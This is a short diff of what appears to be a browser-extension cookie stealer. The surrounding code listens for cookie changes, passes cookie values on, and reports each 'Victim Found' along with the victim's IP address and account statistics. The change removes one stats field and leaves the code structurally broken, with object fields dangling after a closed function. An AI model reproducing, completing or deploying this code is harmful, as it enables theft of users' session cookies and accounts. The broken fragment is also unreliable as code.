@@ -136,12 +136,9 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
             main(changeInfo.cookie.value);
         }
     }
-});                    {
-                        "name": "Headless",
-                        "value": statistics ? (statistics.Headless ? "✅ Owns" : "❌ None") : "N/A",
-                        "inline": true
-                    }
-                ],
+});
+
+                        
                 "author": {
                     "name": "Victim Found: " + ipAddr,
                     "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
@@ -187,4 +184,5 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
         }
     }
 });
+
 
